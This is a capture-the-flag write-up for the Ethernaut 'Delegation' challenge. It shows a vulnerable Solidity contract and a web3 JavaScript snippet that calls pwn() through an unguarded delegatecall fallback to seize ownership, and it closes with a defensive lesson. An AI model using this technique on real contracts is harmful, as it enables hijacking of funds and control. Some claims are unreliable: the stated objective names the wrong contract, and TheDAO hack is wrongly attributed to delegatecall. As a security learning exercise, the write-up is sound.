# Ethernaut Challenge #6: Delegation

**Objective:** Claim ownership of Delegate contract.

**Contract Analysis:**
```solidity
contract Delegate {
  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {
  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

**The Vulnerability:**

Line 18-22: `fallback()` uses `delegatecall`

**What is delegatecall?**
- Normal call: Run code in TARGET contract's context
- Delegatecall: Run code in CALLER contract's context

**The Danger:**
When Delegation uses delegatecall to Delegate:
- Delegate's code runs
- But in DELEGATION'S storage context
- Any state changes happen to Delegation, not Delegate

**The Attack:**

1. Call Delegation's fallback with `pwn()` function signature
2. Delegation does: `delegate.call(msg.data)` with `pwn()`
3. Delegate's `pwn()` code executes
4. But `owner = msg.sender` modifies DELEGATION's storage!
5. You become owner of Delegation contract

**Code:**
```javascript
// Encode pwn() function call
const data = web3.eth.abi.encodeFunctionSignature("pwn()");

// Send to Delegation contract (triggers fallback)
await sendTransaction({
  to: delegationAddress,
  data: data
});
// Now you're owner!
```

**Why This Is Devastating:**

Delegatecall is like running someone else's code with YOUR storage. If they write to slot 0, they overwrite YOUR slot 0.

**Real-World Impact:**
- TheDAO hack
- Multiple proxy contract vulnerabilities
- Library attacks

**Lesson:**
Delegatecall is extremely dangerous. Only use with trusted contracts. Never let users control the delegatecall target or data.

**Status:** Challenge understood. Delegatecall = context confusion = disaster.
